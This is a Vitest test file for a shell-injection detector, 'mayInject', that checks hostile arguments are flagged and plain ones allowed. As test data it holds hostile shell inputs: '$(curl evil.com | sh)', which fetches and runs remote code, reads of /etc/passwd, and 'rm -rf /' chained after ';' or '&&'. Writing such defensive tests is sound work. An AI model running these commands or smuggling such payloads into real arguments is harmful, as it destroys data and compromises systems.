import { describe, expect, it } from "vitest";

import { mayInject } from '../../src/mandates/recipeShellInjectGate.js';

describe("mayInject — command substitution", () => {
  it("rejects $(…) command substitution", () => {
    for (const arg of [
      "$(id)",
      "$(cat /etc/passwd)",
      "$(curl evil.com)",
      "$(ls -la)",
      "$(echo injected)",
      "$(whoami)"
    ]) {
      expect(mayInject(arg), arg).toBe(true);
    }
  });

  it("rejects backtick command substitution", () => {
    for (const arg of ["`id`", "`whoami`", "`cat /etc/passwd`"]) {
      expect(mayInject(arg), arg).toBe(true);
    }
  });

  it("rejects combined $(…) + shell metacharacters", () => {
    expect(mayInject("x; $(curl evil.com | sh)")).toBe(true);
    expect(mayInject("$(curl evil.com) > /tmp/out")).toBe(true);
  });
});

describe("mayInject — shell metacharacters", () => {
  it("rejects semicolons (command separator)", () => {
    for (const arg of [
      "x; rm -rf /",
      "; cat /etc/passwd",
      "safe;evil",
      "hello; world"
    ]) {
      expect(mayInject(arg), arg).toBe(true);
    }
  });

  it("rejects pipes", () => {
    for (const arg of ["x | evil", "| sh", "a|b"]) {
      expect(mayInject(arg), arg).toBe(true);
    }
  });

  it("rejects redirections", () => {
    for (const arg of ["> /tmp/evil", "x>>.env", "< /etc/passwd", "x > /dev/null"]) {
      expect(mayInject(arg), arg).toBe(true);
    }
  });

  it("rejects ampersands (background / AND-if control)", () => {
    for (const arg of ["x &", "this & that"]) {
      expect(mayInject(arg), arg).toBe(true);
    }
  });

  it("rejects && and || list operators", () => {
    for (const arg of ["x && rm -rf /", "cmd1 || cmd2"]) {
      expect(mayInject(arg), arg).toBe(true);
    }
  });
});

describe("mayInject — shell expansions", () => {
  it("rejects ${VAR} parameter expansion", () => {
    for (const arg of ["${HOME}", "${PATH}", "${USER}", "${SHELL}"]) {
      expect(mayInject(arg), arg).toBe(true);
    }
  });

  it("rejects bare $VAR expansion", () => {
    for (const arg of ["$HOME", "$PATH", "$USER"]) {
      expect(mayInject(arg), arg).toBe(true);
    }
  });

  it("rejects brace expansion {a,b}", () => {
    for (const arg of ["{foo,bar}", "{a,b,c}"]) {
      expect(mayInject(arg), arg).toBe(true);
    }
  });
});

describe("mayInject — newlines", () => {
  it("rejects embedded newlines", () => {
    expect(mayInject("hello\nworld")).toBe(true);
    expect(mayInject("x\nrm -rf /")).toBe(true);
  });
});

describe("mayInject — allowed (safe args)", () => {
  it("allows plain strings", () => {
    for (const arg of [
      "hello world",
      "simple",
      "some arg with spaces"
    ]) {
      expect(mayInject(arg), arg).toBe(false);
    }
  });

  it("allows flags", () => {
    for (const arg of ["--verbose", "-v", "--output=dir", "-o"]) {
      expect(mayInject(arg), arg).toBe(false);
    }
  });

  it("allows paths", () => {
    for (const arg of ["/home/user/file.txt", "./relative/path", "README.md"]) {
      expect(mayInject(arg), arg).toBe(false);
    }
  });

  it("allows numbers", () => {
    for (const arg of ["42", "3.14", "-10"]) {
      expect(mayInject(arg), arg).toBe(false);
    }
  });

  it("allows version strings and identifiers", () => {
    for (const arg of ["main", "feature-branch", "v1.2.3", "some-arg_value", "refs/heads/main"]) {
      expect(mayInject(arg), arg).toBe(false);
    }
  });

  it("allows hyphens and underscores as data", () => {
    expect(mayInject("some-arg_value")).toBe(false);
    expect(mayInject("--flag=value")).toBe(false);
  });
});

describe("mayInject — edge cases", () => {
  it("returns false for empty string", () => {
    expect(mayInject("")).toBe(false);
  });

  it("returns false for whitespace-only", () => {
    expect(mayInject("   ")).toBe(false);
    expect(mayInject("\t")).toBe(false);
  });

  it("returns false for a single safe character", () => {
    expect(mayInject("x")).toBe(false);
  });

  it("rejects a bare backtick anywhere in the arg", () => {
    expect(mayInject("`")).toBe(true);
    expect(mayInject("safe`")).toBe(true);
  });

  it("rejects a bare dollar-parens sequence", () => {
    expect(mayInject("$(")).toBe(true);
  });

  it("does NOT reject parentheses without a leading $", () => {
    expect(mayInject("(text)")).toBe(false);
    expect(mayInject("some (thing)")).toBe(false);
  });

  it("does NOT reject a bare dollar sign alone", () => {
    expect(mayInject("$")).toBe(false);
  });
});
